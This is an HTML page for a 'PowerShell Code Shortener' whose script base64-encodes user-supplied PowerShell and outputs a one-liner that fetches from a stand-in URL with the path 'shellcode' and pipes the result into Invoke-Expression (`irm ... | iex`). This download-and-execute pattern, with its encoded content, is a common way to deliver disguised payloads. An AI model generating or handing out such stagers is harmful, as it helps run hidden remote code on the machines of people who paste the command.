<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PowerShell Shortener</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(to right, #2a0845, #6441a5);
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        h1 {
            margin-bottom: 30px;
            font-size: 3rem;
            text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.9);
        }
        .container {
            background-color: rgba(40, 40, 70, 0.85);
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 0 30px rgba(0, 0, 0, 0.9);
            width: 90%;
            max-width: 600px;
        }
        textarea {
            width: 100%;
            height: 150px;
            border-radius: 10px;
            padding: 10px;
            border: none;
            resize: none;
            margin-bottom: 20px;
        }
        button {
            padding: 15px 25px;
            font-size: 18px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            background-color: #9b59b6;
            color: white;
            transition: background-color 0.3s, transform 0.2s;
        }
        button:hover {
            background-color: #af7ac5;
            transform: scale(1.05);
        }
        #shortened-output {
            margin-top: 20px;
            background-color: rgba(120, 0, 150, 0.3);
            padding: 10px;
            border-radius: 10px;
            word-wrap: break-word;
        }
    </style>
</head>
<body>

    <h1>PowerShell Code Shortener</h1>
    <div class="container">
        <textarea id="ps-code-input" placeholder="Enter your PowerShell code here..."></textarea>
        <button onclick="generateShortCode()">Generate Short Code</button>
        <div id="shortened-output">Shortened Code will appear here...</div>
    </div>

    <script>
        function generateShortCode() {
            const psCode = document.getElementById("ps-code-input").value;
            if (!psCode.trim()) {
                alert("Please enter valid PowerShell code.");
                return;
            }

            // Encode the PowerShell code into Base64
            const base64Code = btoa(unescape(encodeURIComponent(psCode)));
            // Generate the short code with `irm` and `iex`
            const shortenedCode = `irm 'https://example.com/shellcode?code=${base64Code}' | iex`;

            // Display the shortened code
            document.getElementById("shortened-output").textContent = shortenedCode;
        }
    </script>

</body>
</html>
